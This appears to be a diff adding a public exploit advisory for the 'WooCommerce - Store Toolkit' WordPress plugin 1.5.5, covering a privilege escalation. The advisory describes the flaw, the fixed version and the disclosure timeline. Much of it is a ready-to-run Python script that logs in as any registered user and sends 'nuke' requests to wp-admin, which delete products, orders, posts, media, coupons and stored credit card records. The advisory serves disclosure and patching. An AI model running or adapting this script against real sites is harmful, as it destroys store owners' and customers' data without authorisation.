@@ -1,0 +1,118 @@
+'''
+* Exploit Title: WordPress WooCommerce - Store Toolkit Plugin [Privilege Escalation]
+* Discovery Date: 2016-02-06
+* Public Disclosure Date: 2016-02-08
+* Exploit Author: Panagiotis Vagenas
+* Contact: https://twitter.com/panVagenas
+* Vendor Homepage: http://www.visser.com.au/
+* Software Link: https://wordpress.org/plugins/woocommerce-store-toolkit/
+* Version: 1.5.5
+* Tested on: WordPress 4.4.2
+* Category: webapps
+
+Description
+-----------
+
+The plugin "WooCommerce - Store Toolkit" for WordPress suffers from a privilege escalation vulnerability.
+
+An attacker must have a valid user account which is possible simply by registering to the infected website. This is possible because this plugin must be installed in a website with WooCommerce plugin to be any of use. Since WooCommerce is an e-store plugin allows user registration by default, so we assume that all websites that have the "WooCommerce - Store Toolkit" plugin are also open to user registration.
+
+As long as an attacker have an active account at the infected website he can perform the attack at ease because no action validation is taking place from the "WooCommerce - Store Toolkit" plugin. The "WooCommerce - Store Toolkit" plugin is designed to perform a set of actions like:
+
+- Permanently delete all posts, post categories and post tags
+- Permanently delete all media (attachments)
+- Permanently delete all products, product categories, product tags and attributes
+- Permanently delete all orders
+- Permanently delete all comments
+
+All these actions they normally require administrative wrights. But in this case any registered user can perform these actions, even with the most limited wrights, therefor this issue is considered as an Privilege Escalation vulnerability.
+
+PoC
+---
+
+The following script will nuke nearly all site content from `example.com` using the account with username:`username` and password:`password`. This has to be an already registered account for this to work.
+''' 
+
+#!/usr/bin/python3
+
+################################################################################
+# WooCommerce - Store Toolkit Privilege Escalation Exploit
+#
+# **IMPORTANT** Don't use this in a production site, if vulnerable it will
+# delete nearly all your site content
+#
+# Author: Panagiotis Vagenas <pan.vagenas@gmail.com>
+################################################################################
+
+import requests
+
+loginUrl = 'http://example.com/wp-login.php'
+adminUrl = 'http://example.com/wp-admin/index.php'
+
+loginPostData = {
+    'log': 'username',
+    'pwd': 'password',
+    'rememberme': 'forever',
+    'wp-submit': 'Log+In'
+}
+
+l = requests.post(loginUrl, data=loginPostData)
+
+if len(l.history) > 1:
+    loggedInCookies = l.history[0].cookies
+else:
+    loggedInCookies = l.cookies
+
+if len(loggedInCookies) == 0:
+    print("Couldn't acquire a valid session")
+    exit(1)
+
+actions = [
+    'woo_st_products',
+    'woo_st_categories',
+    'woo_st_product_categories',
+    'woo_st_product_tags',
+    'woo_st_product_brands',
+    'woo_st_product_vendors',
+    'woo_st_product_images',
+    'woo_st_coupons',
+    'woo_st_attributes',
+    'woo_st_sales_orders',
+    'woo_st_tax_rates',
+    'woo_st_download_permissions',
+    'woo_st_creditcards',
+    'woo_st_google_product_feed',
+    'woo_st_posts',
+    'woo_st_post_categories',
+    'woo_st_post_tags',
+    'woo_st_links',
+    'woo_st_comments',
+    'woo_st_media_images'
+]
+
+for action in actions:
+    print('Trying action '+action)
+    a = requests.post(adminUrl, data={'action': 'nuke', action:1}, cookies=loggedInCookies, timeout=30)
+    if a.status_code == 200:
+        print('Nuked with action '+action)
+    else:
+        print('Something went wrong with action '+action)
+
+exit(0)
+
+'''
+Solution
+--------
+
+Upgrade to v1.5.7
+
+Timeline
+--------
+
+1. 2016-02-07: Vendor notified through WordPress support forums
+2. 2016-02-07: Vendor notified through his homepage support
+3. 2016-02-07: Requested CVE ID
+4. 2016-02-07: Vendor responded
+5. 2016-02-07: Send issue details to vendor
+6. 2016-02-08: Vendor released version 1.5.7 which resolves this issue
+'''
